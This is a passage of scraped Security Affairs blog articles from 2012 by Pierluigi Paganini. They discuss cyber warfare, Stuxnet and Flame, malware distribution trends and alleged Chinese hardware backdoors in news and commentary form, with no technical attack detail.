calls.\n\nAn effective cyber defence requires the creation of inclusive trustworthy and dependable communication and computation systems to protect the legitimate interests of all stakeholders in multi-jurisdiction, multi-stakeholder Internet-scale environments. Future systems should embody the democratic principles of laws (fault tolerance, separation of powers, system of checks and balances, mutual accountability) directly in their architecture.\n\n \n\nThe ICT Gozo Malta Project and Synaptic Labs supports this vision by designing genuinely safe and secure ICT systems, with new commercial capabilities, to improve cyber security and safety across existing ICT infrastructures. Modern life depends on ICT, and citizens deserve to have the confidence of knowing that the weaknesses in current critical infrastructures and their personal computing devices are being addressed and removed.

Suddenly the world have realized the danger of cyber weapons, their cyber capabilities and their insidious ability to operate silently in the years without apparent damages, the latter factor characteristic of the cyber sector.\n\nThe major world powers have realized the importance of this new type of attack, characterized by lower investment compared to conventional attacks and especially the ability to work under cover without having to seek the views of the international community about a possible military cyber intervention.\n\nJust President Obama is one of the main supporters of this new possibility offensive, politically convenient and devastating as military option.\n\nThe dissemination of news about the Olympic Games project promoted by Bush and  sustained by Obama represents the consecration of the concept of cyber war. The states are investing heavily in the area, recruiting hackers even by the civil sector to build cyber armies to engage in continuous offensive, the American Plan X is an example.\n\nNews regarding the discovery of new cyber weapon will be published with increasing frequency, the real problem is to ask if the world is really prepared to respond to these attacks. The stakes are high, security is critical for every nation, the whole world must be analyzed as a monolith system in which the weakness of a single nation could jeopardize a balance on a global scale.\n\nWars today are fought with keyboards to the sound of bits, the scenario we are facing is extremely complex, on the one hand we have technologically advanced nations such as U.S. and Israel, on the other nations who are entering the cyber scene with aggressive policies such as China, or Iran that is investing significantly to attacks its rivals.\n\nThe reality is that even major nations today are too vulnerable to cyber attacks, too many governments are now interested in organizing offensive regardless of the possible effects on their citizens, this is extremely worrying.\n\n\n\nToday there is no open dialogue between the nations on the subject, but what is more concerned is the limited involvement of the people on the issue, too many people completely ignore the risks of a cyber attack.\n\nOfficially cyberspace is addressed in every cyber strategy as a domain of war,\n\nThe Pentagon has recognized it as a vital environment to defend like land, sea, air and space. Another focal point in approaching the concept of cyber warfare is the involvement, of actors that were once out of power plays and political dialogue. Today it is relatively easy to train a group of hackers or hire cyber mercenaries to work on a project to attack a foreign state. The opportunity is less attractive to governments, but also for groups of cyber criminals and hacktivist. The event primarily Stuxnet, Flame then opened new dangerous scenarios, we are all aware that the tip of the iceberg.\n\nCyber attacks are unpredictable and difficult to trace, due this reason before to invest in offense nations must be aware of cyber defense sector. The discovery of the last cyber weapons has surely accelerated the development of similar agents all over the world. Today is quite simple to retrieve the source code of this agents o the underground market, this is very dangerous because new teams of experts could elaborate it to produce new aggressive agents.\n\nR. Scott Kemp, a global security specialist at Princeton\u2019s Woodrow Wilson School for Public and International Affairs, declared that the U.S. should prepare to defend itself, but not to attack:\n\n \u201ca Stuxnet-like attack can now be replicated by merely competent programmers, instead of requiring innovative hacker elites. It is as if with every bomb dropped, the blueprints for how to make it immediately follow.\u201d\n\nThat\u2019s true as dangerous!\n\nLet\u2019s me conclude with a statement from the article\n\n\u201cJust about everything that relies on computer code and links to a network could be vulnerable to attack: communications systems, satellites, security systems, banking networks, trains, power plants, water systems and power grids\u201d\n\nit is a perfect picture of today society, we all nodes of the same network, we must protect it!\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/olympic-games", "topic_name": "'Olympic Games'"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-defense", "topic_name": "cyber defense"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-mercenaries", "topic_name": "cyber mercenaries"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-war", "topic_name": "cyber war"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapons", "topic_name": "cyber weapons"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flame", "topic_name": "Flame"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/israel", "topic_name": "Israel"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/pentagon", "topic_name": "Pentagon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/plan-x", "topic_name": "Plan X"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/warfare", "topic_name": "warfare"}]}, {"news_name": "The mystery of a massive cyber attack on Iran", "news_link": "https://securityaffairs.co/wordpress/6733/intelligence/the-mistery-of-a-massive-cyber-attack-on-iran.html", "title": "The mystery of a massive cyber attack on Iran\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "June 23, 2012", "body": "Winds of cyber war blow Iran, the political situation is becoming difficult to manage, exacerbating the tones of a psychological battle growing.\n\nAfter the publishing of the news regarding the genesis of Stuxnet and Flame every actor of the conflict has increased the effort on cyber warfare especially on cyber defense fearing an imminent cyber attack of the enemy.\n\nIranian high officials have accused US, Israel and UK of planning a \u201cmassive cyber attack\u201d against their government.

With the term we indicate in fact several types of malicious code such as computer viruses, worms, trojan, spyware, ramsonware, adware, rootkits, and other applications. In recent years we have witnessed an unprecedented growth in the development of malware linked to rapidly changing of the technological context supported by the increased use of internet and the explosion of mobile services. Internet has condensed billions of entities into a single virtual marketplace in which the spread of pathogens is to be considered natural as would happen in real life between individuals. To give an idea of what we have observed in the recent years consider that in the last couple of years the release rate of malicious code and other unwanted programs was greater of the one related to previous 20 years. To monitor the diffusion of the cyber threats major security firms have deployed specific  network all over the world capturing spam, phishing and malware data through a variety of sources, such as decoy accounts and network probes. Billions email messages and Web requests are processed daily processed in dedicated data centers, gathered information are put in relation with data acquired through an antifraud community of enterprises, law enforcement advisor and consumers feedback. Let\u2019s see the case of Symantec that with a similar model of analysis provides periodically report and bulletins on the evolution of malware and more in general of any cyber threat. Giving look to the last issue \u201cInternet Security Threat Report\u201d we can have an idea on the trend related to malware evolution and the sector mainly impacted.\n\n\n\nIt has been reported an increase respect last year result of a surge in polymorphic malware attacks, particularly from those found in Web attack kits and socially engineered attacks using email-borne malware. Particularly dangerous are malware that exploit zero-day vulnerabilities, almost impossible to know when they attack a target, because they are developed to operate in stealth mode to evade detection systems. According the report it has been registered an increase of unique variants of malware 140% respect 2010, passing from 286 million of variants to 403 million. The trend is also confirmed looking data related to new zero-Dayvulnerabilities rate that is of 8 new vulnerabilities per day.\n\nThe spread of malware in recent years has been made possible following various schemes for which we try to provide a quick overview below. One of the main channels exploited for Malware is internet and in particular the possibility to host the malicious agent on compromised web site. The categories of web sites mainly impacted by this type of attack are Blogs & Web communications, Hosting/Personal hosted sites, Business/Economy, Shopping and Education & Reference. The malware diffusion during last year is rapidly increased due to the growth of \u201cDrive-by attacks\u201d against internet users. The figures are amazing with hundreds of millions of system infected every year. The infection process is subtle but effective, it is sufficient that users visit a compromised website. The redirection of the user navigation on the site follows different schemas, for example it is necessary a click on a link contained in an email or on a link published on social network, in this way the victim is hijacked on infected websites. Very common are attack techniques such as \u2018clickjacking\u2019 or \u2018likejacking\u2019 that deceives the users attracting him to watch a video or simply expressing its pleasure regarding a specific topic using \u201cI like\u201d function. Another factor that has dramatically impacted on the malware diffusion is the availability in internet of exploit toolkits which allow creation new malware requesting few capabilities. This peculiarity it has facilitated the rapid adoption and diffusion of the attack kits in the criminal world that have intercepted the growing demand in a millionaire business, a phenomenon that continues in its inexorable rise. Let also consider how quickly these kit are updated with new exploits, in some cases new development are commitment to add new features to an existent malware, we are facing with the malware factory. If you are scared of the price of these toolkit, don\u2019t worry, usually they are really cheap with prices ranging from a few dollars to a few thousand. Another preferred channel used to spread malware is of course the email. During the last year the number of malicious email is increased targeting mainly large company. Usually malicious emails contain infected file as attachment that exploit vulnerabilities in the target system, it\u2019s clear that to circumvent the user the content of the mail appears legitimate and try to catch the attention of the victim. Similar attacks are used by cybercriminal but also by governments like happened in Syria where the regime to persecute opponents has used malicious email containing malware to trace them. This is not the only schema for malware diffusion, as we have already discussed malicious emails could also contain link to infected web site. I have left for last the discussion of another method of malware diffusion that is seriously impacting user\u2019s digital life, the social networks. During the last year with the impressive growth of social network we have also observed the increase of the number of malware propagated using the popular social platforms. Millions of user always connected and with low awareness on the cyber threats are ideal victims for cybercrime that once again uses malware to exploit user\u2019s vulnerabilities. In the social networking the fundamental factor is use of social engineering techniques to circumvent users that most often are redirected on compromised web sites through the sharing of \u201cmalicious hyperlink\u201d. The most important social network are always under attacks, cyber criminals and hackers daily address social network\u2019s users with any kind of malware variant, it\u2019s the case for example of the last discovered related to Zeus Trojan. The experts of Trusteer firm have discovered a new variant Zeus malware responsible for a series of attacks against principal internet service providers. The variant carried out attacks using the P2P network architecture targeting users of Facebook, Hotmail and Yahoo and Google Mail. The malware is really appreciated by cyber criminals that have improved its feature over the months. Zeus Trojan is born as an agent able to steal banking information by logging keystrokes and form grabbing, it is spread mainly through phishing and drive-by downloads schemes. The malware variant that hit Facebook uses a web injection mechanism to propose to the victims a special price reduced of 20% for purchases made with Visa or MasterCard debit card using their Facebook account. The scam promises in fact that after registering debit card information, the victim will earn cash back when they purchase Facebook points. Of course to the user is proposed a form for the registration of debit card info that is equivalent to a legitimate one also in term of proposed layout\n\nThe use of malware, as described, presents a sustained growth trend thanks to the operational flexibility of the cyber threat that makes fruitful use of malicious programs in several areas. The areas where the malware have found major use are:\n\nThe criminal organizations are the most active in the development and diffusion of malware, malicious programs that could be developed to realize complex frauds with reduce risks. Criminal gangs have discovered how much lucrative is the cybercrime and how reduced are the possibility to be legally pursued. Computer crime by its nature has placed in the cyberspace with direct effects on the real world, but due this characteristic, its persecution is virtually impossible for the absence of globally shared regulations against this type of illicit. Malware could be used in different fraud patterns, mainly their use is to steal user sensible information like banking credentials. The diffusion could happen through several channels like social networking, mail spamming, visiting infecting host or hijacking web navigation. The common factor is the identity theft of the user for fraudulent activity. During the last weeks we have assisted to the rapid diffusion of new generations of Ransomware demonstrating that the use of malware could be adapted for different model of cybercrimes. Ransomware is a type of malware which restricts access to the computer resources of the victim demanding the payment of a ransom for the removal of the restrictions. To prevent the access to the resources the malware encrypt files of infected machine. Cybercrime is not only the sector that adopts malware for its purposes, one of the most interesting usage is related to cyber warfare.  Borrowing definition of \u201ccyber weapon\u201d provided by security experts Thomas Rid and Peter McBurney :\n\n\u201ca computer code that is used, or designed to be used, with the aim of threatening or causing physical, functional, or mental harm to structures, systems, or living beings\u201c\n\nwe can immediately think to the effect of a computer malware targeted against a strategic objective such as a critical infrastructure. Over the years many cyber weapons have been identified, without a doubts the most famous of which is the virus Stuxnet, for its development is common opinion that has been involved, by US and Israel Governments, a pool of high specialists. Stuxnet is not the unique example of usage of malware as cyber weapon, Duqu malware in fact is a similar agent that has been deployed with the purpose of information gathering, ideal for espionage operations. The reality is more complex, the future for malware in cyber warfare scenario is made of dedicated platform used to create multiform and modular agent that could target specific objectives simply including new components. We are facing with open projects that evolve with the need and in function with specific targets present new offensive features. Kaspersky\u2019s director of global research & analysis, Costin Raiu, discovered with his team the existence of a common platform to build the malwares Duqu and Stuxnet, that they named \u201cTilded platform\u201d because many of the files in agents have names beginning with the tilde symbol \u201c~\u201d and the letter \u201cd.\u201d\u201d. What is really interesting is that the researcher is convinced that the same framework has been also used to create at least three other pieces of malware confirming the existence of a \u201cfactory\u201d platform that Costin Raiu defined using the following statement:\n\n\u201cIt\u2019s like a Lego set. You can assemble the components into anything: a robot or a house or a tank,\u201d\n\n\n\nBut malware could be also the next option of group of hacktivist such as Anonymous. During the last couple of years we have witnessed the escalation of operations conducted by the Anonymous group, the hacker group that is expressing a social dissent through cyber attacks. Is common conviction that the group use only DDoS attacks for its operations, but the collective is changing and some security experts believe that they are also exploring other options such as malware deployment.  The purposes of malware usage maybe be different, malicious software could be used to attack strategic objectives with targeted campaign and also to conduct cyber espionageoperations. Also DDoS attacks could be automated infecting machines of the victims or simply hosting a malware on a website that redirect the attacks against the chosen targets. Another regrettable usage of malware is monitoring and controlling, typically implemented by governments and intelligence agencies. In most cases virus and trojan have been used to infect computer used to attack dissident, opponents and political oppositions. The purpose is to track their operation on the web, gather sensible information and localize them. In many cases the use of malware has made possible the capture of the victims and their ruthless suppression. During the Syrian repression the government has discovered that dissidents were using program such as Skype to communicate, so it has used the same channel to spread the backdoor \u201cXtreme RAT\u201d. The schema of the targeted attacks was simple, after the arrest of some dissidents, the government has used their Skype accounts to spread a malware hidden in a file called MACAddressChanger.exe that was accepted by others activists. The dissidents were confident in the MACAddressChanger usage that they have used in the past to elude the monitoring system of the government. Xtreme Rat is a malware that belong to the Remote Access Tool category really simple to retrieve on line at a low price (Full version Price: \u20ac100 EUR). To confirm that backdoor has been installed by the Syrian Government is the IP address of the command server that belongs to Syrian Arab Republic \u2014 STE (Syrian Telecommunications Establishment). The sample reported is not the only one, the experts of the Trend Micro firm have in fact discovered the usage of the malware DarkComet to infect the computers of the opposition movement. The malware is used to steal documents from the victims and it appears to have been spread through Skype chats.  Once in execution the malware try to contact the command and control (C&C) server to receive instruction and also to transfer the stolen information. It has been observed that the C&C server is resident in Syria, the range of the IP addresses is under the control of the government of Damascus.\n\nThe scenarios reported share the same trend in the malware growth, more complex agents are daily developed being able to exploit well know vulnerabilities but also 0-days ones. Millions of PC are infected with new variants of malware composing scary botnet that are used for several purpose, the major concerns come from mobile technologies and cloud computing paradigm, in particular the mobile world has registered the major number of malware that have targeted its platforms and operating system. To give an idea on how much attractive is the mobile technology for malware developer let\u2019s give a look to the Mobile Threat Report released by security firms F-Secure that warns of a dramatic increase in malware targeting mobile devices, especially Androind OS based. The following table reports interesting statistics on mobile threats discovered between 2004 and 2011, showing an impressive growth grouped by malware type.\n\n\n\nAccording the report \u201cIn Q1 2011, 10 new families and variants were discovered. A year later, this number has nearly quadrupled with 37 new families and variants discovered in Q1 2012 alone,\u201d the report states.\n\n\n\nThe experts of F-Secure attributes the growth to the increasing number of variants designed to evade antivirus protections by utilizing a greater number of signatures.\n\n\u201cA comparison between the number of malicious Android application package files (APKs) received in Q1 2011 and in Q1 2012 reveals a more staggering find \u2014 an increase from 139 to 3063 counts. This growth in number can be attributed to malware authors crafting their infected or trojanized applications to defeat anti-virus signature detection, distributing their malware in different application names, and trojanizing widely popular applications,\u201d the report notes.\n\nThe situation can only worsen in the near future, more than worry about evolution of malware in the mobile landscape I\u2019m worried by the impressive increase of polymorphic malware that are able to provide different signatures to evade security systems making difficult pattern-matching detection implemented by major antimalware software. The battle against these powerful cyber threats must move on two parallel tracks, prevention and response. The first aspect requires a high level of awareness of the related risks that can be obtained through well-designed information campaigns and through the establishment of a greater number of control centers and monitoring institutions. Regarding the second aspect it is desirable that computer crimes can be prosecuted with a globally recognized law that provides stiff penalties for criminals.

U.S. Defense Secretary Leon Panetta often has expressed very concern about the possibility of a major cyber attack against the country and its critical infrastructures.\n\n\n\nThe government is planning the biggest cuts to defense budget of the last decade, around $450 billion over a period of ten years. Persistent rumors speak of a further cut of $500 billion due an automatic mechanism of protection known as sequestration after members of Congress failed to reach an agreement to reduce the nation\u2019s deficit.\n\nThe cuts represent a serious problem for the development of US capabilities in a delicate historical period, the principal enemies of US such as Iran, China and also Russia are massive investing trying to acquire a strategic advantage under this perspective.\n\nSecretary Panetta warned on the possible risks deriving from the cuts, on the argument he said:\n\n\u201cIt would guarantee that we hollow out our force and inflict severe damage on our national defense. I think you all recognize that sequester would be entirely unacceptable and I really urge both sides to work together to try to find the kind of comprehensive solution that would de-trigger sequester and try to do this way ahead of this potential disaster that we confront,\u201d \n\n\u201cI\u2019m very concerned that the potential in cyber to be able to cripple our power grid, to be able to cripple our government systems, to be able to cripple our  financial systems would virtually paralyze this country and as far as I\u2019m concerned that represents the potential for another Pearl Harbor  as far as the kind of attack that we could be the target of using cyber,\u201d \n\nThe scenario hypothesized by Panetta is realistic and dramatic, a cyber attack against an US critical system could represent a disaster. The possible source of attacks could be foreign government but also cybercriminals or cyber terrorists.\n\nEvery day thousands of attacks hit US networks and the trend show an increasing frequency, cyber espionage is the most insidious cyber threat, to tackle this offensive are necessary continuous and huge investments in cyber defense capabilities.\n\nAnother question raised by the main military authorities is related to the enormous expenses for the campaigns abroad of American troops, first of all in Afghanistan, the cost of sending supplies into Afghanistan through alternate routes is about $100 million a month. If the economic situation is complex and dangerous, other clouds are gathering on U.S. cyber warfare capabilities.\n\nLeading cyber experts have alerted US government on the shortage of talented computer security specialists to hire in the cyber security circuit.\n\nThe research of skilled experts is one of the first goals of US administration that have promoted several projects such as Plan X.\n\nAccording to experts, lacking several tens of thousands of experts to allocate in activities related to cyber defense and cyber offense. Of course the shortage could represent a desiderable opportunity of business for private companies, for example U.S. defense contractor Northrop Grumman Corp has recently promoted the first undergraduate honors program in cyber security with the intent to be highly specialized in cyber warfare.\n\nThe main government agencies are also trying to hire consultants form private industry, but in same cases security firms have refused to send their most talented cyber experts to avoid of losing them.\n\nAccording many experts, due this reason, usually in governments project are involved a \u201csecond level\u201d of experts from private businesses or they locking down the main resources with special agreements.\n\nAccording unofficial sources, governments are also searching for experts in the cyber underground and attempting the main hacker events all over the world.\n\nLet me conclude with a declaration of Eugene Kaspersky ,CEO of Kaspersky Lab, on the actual cyber situation:\n\nNow we\u2019re living in the era of cyber weapons. The world is different. Not just cyber hooligans, vandals. Not just criminals. But governments are in the game and I\u2019m afraid for the worst, I\u2019m still expecting, cyber terrorism.\u201d\n\nThe involvement of governments is strong and the problems alerted on US cyber defense represent serious concerns, the cyberspace could become soon the reign of anarchy and the impact on real world could be dramatic.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-experts", "topic_name": "cyber experts"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-terrorists", "topic_name": "cyber terrorists"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cybercriminals", "topic_name": "cybercriminals"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flame", "topic_name": "Flame"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/plan-x", "topic_name": "Plan X"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/russia", "topic_name": "Russia"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/us", "topic_name": "US"}]}, {"news_name": "Flame and Stuxnet, the union is strength", "news_link": "https://securityaffairs.co/wordpress/6373/intelligence/flame-and-stuxnet-the-union-is-strength.html", "title": "Flame and Stuxnet, the union is strength\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "June 12, 2012", "body": "During the Global Media and Technology Summit Eugene Kaspersky, CEO of Kaspersky Lab, revealed to the Reuters agency that the team of experts of his company has found strong similarities between part of the Flame source code and a 2009 version of Stuxnet.\n\nThe news is really surprising, the analogies demonstrate that behind the development and the diffusion of such cyber weapons in the Middle East there is the same team of experts.\n\nIn the last weeks, an uncomfortable truth was disclosed by The New York Times that could have shed light on one of the most disturbing questions of global security landscape. The planning of the deadly cyber weapon, Stuxnet, started under the administration of George Bush Junior as part of a military operation named \u201cOlympic Games\u201d, but the Obama administration has been pushing a more energetic on the offensive program.\n\nThe article published in the popular newspaper is adapted from journalist David Sanger\u2019s forthcoming book, Confront and Conceal: Obama\u2019s Secret Wars and Surprising Use of American Power, and it confirms that both the US and Israeli governments developed and deployed Stuxnet.\n\nThe announcement made by Eugene Kaspersky confirms that the Flame malware share with Stuxnet the same cyber project developed to attack a country in the Middle East and in particular the Iran.\n\n\n\n\nThe response of Washington to the revelation on the secret project Olympic Games is an internal investigation into the leaks of classified information on the development instead of an official denial of the events.\n\nThe Kaspersky CEO declared:\n\n\u201cthere were two different teams working in collaboration,\u201d\n\nThe Kaspersky team was the first to demonstrate a correlation between the two malware also clarifying the deep differences between them.\n\nStuxnet is considerable a powerful cyber weapon projected to attacks Scada systems inside Iranian nuclear plants meanwhile Flame is a sophisticated tool for cyber espionage.\n\nThe presence of the U.S. behind the development of Flame is not surprising, cyber espionage is one of the main activities covered by a cyber strategy, through which it tries to silently steal confidential information, technologies, and intellectual Property. The ability to infiltrate enemy networks, steal classified information represents a major advantage for those who lead the offensive.\n\nAnalyzing in detail the malware, just spotted Flame, Kaspersky said that the agent was very different from Stuxnet, the latter developed with the Tilded platform, which was used also for the development of the Duqu malware.\n\nFlame and Tilded are completely different, based on different architectures, for instance, Flame never uses system drivers, while Stuxnet and Duqu\u2019s main method of loading modules for execution are via a kernel driver.\n\nThis consideration, however, do not be fooled.\n\nFirst of all, by the time Stuxnet was created in the first half of 2009, the Flame platform was already in existence because the Kaspersky experts have dated it to 2008.\n\nThe sensational discovery is that a Stuxnet instance dated 2009 used a module built on the Flame platform, this module was specifically developed to operate with Stuxnet malware and was removed in the successive versions.\n\nIn the successive version of Stuxnet have been found a new module that have substituted it and that were used to empower the propagation of the agent exploiting the vulnerability MS10-046 instead of the \u201cold\u201d autorun.inf.\n\nInteresting also another discovery of the Kaspersky Labs, the Flame module in Stuxnet exploited a 0-day vulnerability enabling an escalation of privileges, presumably exploiting MS09-025.\n\nResuming the evolution of the two projects has proceeded independently from 2009, this supports the hypothesis that behind Stuxnet and Flame there were two distinct groups of development named by Kaspersky \u201dTeam F\u201d (Flame) and \u201dTeam D\u201d (Tilded).\n\nBoth groups have started the development of the respective malware since 2007-2008 at the latest, they have collaborated in fact in 2009, component from the Flame platform was used in Stuxnet, but since 2010, the platforms have been developing independently from each other.\n\nAfter 2010 the unique analogy is that both teams have exploited the same vulnerabilities. The Kaspersky expert Roel Schouwenberg noted that no Flame components have been used in more advanced versions of Stuxnet:\n\n\u201cFlame was used as some sort of a kick-starter to get the Stuxnet project going,\u201d\n\u201cAs soon as the Stuxnet team had their code ready, they went their way.\u201d\n\nWhy proceed with two different groups of work just before the cyber attack on Iran?\n\nThere may be different reasons, the most likely, such as:\n\nLet\u2019s conclude with a reflection on Flame \u2026 many experts told in the last week that it isn\u2019t a cyber weapon due its espionage prerogative, but we must consider the modular capabilities of the malware and its possibility to load module specifically developed to attack critical infrastructures.\n\nTo emphasize the concept is the same researcher Schouwenberg that said he suspected Flame may be capable of deleting data and attacking industrial control systems, of course there aren\u2019t evidences since now but it is a feasible scenario.\n\nAnyway. Flame is technological project yet to discover, Kaspersky Lab researchers are still working on it to complete understand its functionalities.\n\nPierluigi Paganini\n\nReferences\n\nhttp://www.securelist.com/en/blog?weblogid=208193568\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/olympic-games", "topic_name": "'Olympic Games'"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/critical-infrastructures", "topic_name": "Critical infrastructures"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-attacks", "topic_name": "Cyber attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-crime", "topic_name": "Cyber Crime"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-weapon", "topic_name": "cyber weapon"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/flame", "topic_name": "Flame"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/iran", "topic_name": "Iran"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/scada", "topic_name": "SCADA"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/social-networks-social-network-security-large-scale-infiltration-socialbots-botnets", "topic_name": "Social Networks ; Social Network Security ; Large-scale Infiltration ; Socialbots ; Botnets"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stuxnet", "topic_name": "stuxnet"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/tilded-platform", "topic_name": "Tilded Platform"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/virus", "topic_name": "virus"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/warfare", "topic_name": "warfare"}]}, {"news_name": "U.S. communication equipments subject to China cyber espionage", "news_link": "https://securityaffairs.co/wordpress/6306/intelligence/u-s-communication-equipments-subject-to-china-cyber-espionage.html", "title": "U.S. communication equipments subject to China cyber espionage\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "June 10, 2012", "body": "The new is disturbing, according to former and current intelligence sources Chinese companies have the ability to remotely access to the communication equipments sold to the United States and Western Countries. The revelation made by the open source intelligence company Lignet reinforces a lot of concerns about the possible presence of backdoors in communications devices that could allow the foreign government to disable the telecommunications infrastructure, according the Pentagon analyst, China can shut down all the telecom infrastructures.\n\nAnother disturbing aspect is that the remote control capability of transmitting devices may be exploited over time for purposes of cyber espionage in military and civilian, stealing technology, trade secrets and other confidential information.\n\nDuring last weeks different news circulated on internet regarding the presence of a backdoor in a microchip used by the US military and manufactured in China, the announcement is not isolated in fact also the ZTE company and the Huawei were accused to introduce stealth circuit and software to allow remote control of the sold devices.\n\nSuspects are motivated also by the direct link between companies and Chinese government. Huawei (Officially Huawei Technologies Co. Ltd.) is a Chinese multinational networking and telecommunications equipment and services company. It is the second-largest supplier of mobile telecommunications infrastructure equipment in the world (after Ericsson).\n\nThe company actually provides strategic equipment to the major nations of the world and holds relationships with leading global technological providers.\n\nThe Chinese company has always been a disputed too close to the Chinese government policy and the Chinese People\u2019s Liberation Army. Many point to the company as under a fully government control, pointing out that Ren Zhengfei, the founder of the company, served as an engineer in the Chinese People\u2019s Liberation Army in the early 1980s.\n\nThe company has received numerous allegations in the past, to name a few we think of its proximity to the government and the company has provided support in the implementation of systems of censorship. Also at Huawei has been questioned in the past have supported numerous operations of cyber espionage and cyber attacks such as the operation GhostNet.\n\nHuawei, suspected of exploiting electronic telecommunications with the introduction of backdoors, continues to sell communications technology in the U.S., but its business relationship are serious difficulties. The joint venture between Symantec and Huawei Technologies is ended because the American IT security firms feared that the collaboration with the Chinese telecommunications producer could have a sensible impact on its business. In particular the US Government could not give to Symantec access to its classified information . The risks are really serious, this information could be used by hostiles government in cyber attacks and cyber espionage activities in the short term. While, on the domestic front the US Government, aware of its vulnerability, is moving defining and implementing cyber strategies aimed at strengthening its systems, the events of recent months have shown that relationships with contractors are the weakest link in the chain safety. The governmental contractors exchange sensitive information and therefore it is expected that the government seeks assurances regarding arrangements employed for the management of information.\n\nAnother reason of concern is that also Iran\u2018s security network relies on Huawei technology, and U.S. analysts  fear that the Iranians could access to the same backdoor to compromise U.S. defense.\n\nThe Reuters agency has confirmed that the ZTE Corp, the world\u2019s No.4 handset vendor, reported that one of its mobile phone models sold in the US contains a vulnerability that could allow a remote control of the handset. The backdoor affects ZTE\u2019s Score model based on Android operating system, it\u2019s the first case reported on the platform and many expert are convinced that the event is not casual.\n\nThe presence of a backdoor once again raises the issue of qualification of the hardware, especially if the same is an integral part of a country of critical structures such as communication systems.\n\nThe G2 Bulletin \u201cChinese threat: Shutdown of telecoms\u201d reveals that chip backdoor option could be used before military action against US and Western countries, China in fact has been manufacturing counterfeit components that have introduced into sensitive U.S. weapons systems.\n\n\n\nJust few months ago Department of Homeland security officials are warning of weaknesses in the technology supply chain that result in the importation of devices that are already infected with malware, spyware, backdoors and other malicious code that leave the units vulnerable to exploitation. Backdoor malware is no more a secret. Kill switches and backdoors could be easily hidden into internet devices by the same manufacturers and could be used for the exposed intents by criminals or foreign states once the devices have been deployed by their buyers.\n\nThe White House Cyber Policy Review, released earlier this year, warned that\n\n\u201cthe emergence of new centers for manufacturing, design, and research across the globe raises concerns about the potential for easier subversion of computers and networks through subtle hardware or software manipulations. Counterfeit products have created the most visible supply problems, but few documented examples exist of unambiguous, deliberate subversions.\u201d\n\n\u201cWe do not want a $12 million defense interceptor\u2019s reliability compromised by a $2 counterfeit part,\u201d Gen. Patrick O\u2019Reilly, director of the U.S. Missile Defense Agency said.\n\nLet consider that hardware vulnerabilities are usually very hard to detect, electronics devices could be preloaded with spyware or others malware that could be used to disable or extract data from hosting systems or to use the infected device as a launch point for an attack across the network to which it is attached.\n\nAre we sure regarding the hardware origin? Which are the main problems we can have acquiring hardware in a blind way?\n\nOne of the first consequences of world economic crisis has caused the cutting of budgets in private, public and military sectors encouraging low-cost, off-the-shelf procurement. This has been a dramatic decline in the use of authorized resellers and parts purchased directly from the manufacturer located in Far East. Under the new rules, government contractors were explicitly discouraged from designing systems that required the use of expensive, proprietary electronics or processors that would never be widely produced.\n\nIt is strongly advisable perform deep analysis of the hardware we buy also because often they became part of critical component or infrastructures, but it is not easy to understand and accept that hardware-based security is fundamental.\nToo much people consider the world hardware like synonymous of secure and it\u2019s totally wrong.\n\nThe problem of counterfeit Chinese electronic components, installed by defense contractors without prior accurate testing and are operating in U.S. military systems, is far more widespread than originally thought, because this parts are usually provided by supplier and defense contractors located in the West that import devices from China.\n\nThese counterfeit components have been found in sensitive U.S. weapon systems such as missile systems, in night vision devices and in various military aircraft.\n\nAccording numerous reports provided by the DoD China is considered the most active entity in cyber espionage\n\n\u201cChinese actors are the world\u2019s most active and persistent perpetrators of economic espionage,\u201d \n\n\u201cChinese attempts to collect U.S. technological and economic information will 